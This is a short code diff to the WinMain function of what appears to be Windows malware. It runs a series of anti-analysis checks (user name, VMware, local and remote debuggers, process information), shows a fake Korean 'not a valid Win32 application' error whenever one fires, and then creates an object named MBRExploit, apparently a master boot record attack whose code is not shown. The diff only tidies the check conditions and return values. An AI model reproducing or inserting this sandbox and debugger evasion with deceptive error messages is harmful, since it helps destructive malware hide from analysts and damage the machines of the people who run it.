@@ -238,31 +238,31 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpszCmdPa
 	g_hInst = hInstance;
 	class Anti_Reversing anti = Anti_Reversing();
 
-	if(anti.UserName() == TRUE){
+	if(anti.UserName()){
 		MessageBoxA(0, "이 프로그램은 올바른 Win32 응용 프로그램이 아닙니다.", "오류", MB_ICONERROR);
-		return TRUE;
+		return FALSE;
 	}
 
-	if(anti.IsVMWARE() == TRUE){
+	if(anti.IsVMWARE()){
 		MessageBoxA(0, "이 프로그램은 올바른 Win32 응용 프로그램이 아닙니다.", "오류", MB_ICONERROR);
-		return TRUE;
+		return FALSE;
 	}
 
 	if(anti.BeingDebugged()){
 		MessageBoxA(0, "이 프로그램은 올바른 Win32 응용 프로그램이 아닙니다.", "오류", MB_ICONERROR);
-		return TRUE;
+		return FALSE;
 	}
 
 	if(anti.RemoteDebugger()){
 		MessageBoxA(0, "이 프로그램은 올바른 Win32 응용 프로그램이 아닙니다.", "오류", MB_ICONERROR);
-		return TRUE;
+		return FALSE;
 	}
 
 	anti.InformationThread();
 
 	if(anti.InformationProcess()){
 		MessageBoxA(0, "이 프로그램은 올바른 Win32 응용 프로그램이 아닙니다.", "오류", MB_ICONERROR);
-		return TRUE;
+		return FALSE;
 	}
 
 	class MBRExploit mbr = MBRExploit();
